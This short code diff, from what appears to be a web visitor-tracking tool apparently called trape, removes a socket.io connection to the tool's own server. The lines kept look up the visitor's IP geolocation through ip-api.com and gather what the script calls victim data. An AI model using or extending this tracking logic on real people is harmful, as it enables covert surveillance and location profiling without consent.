@@ -1,10 +1,5 @@
 $(document).ready(function($) {
 
-if (typeof(io) != 'undefined') {
-        namespace = '/trape';
-        var socket = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);
-    }
-
     $.getJSON('//ip-api.com/json', function(data) {
         var d = getVictimData();
 
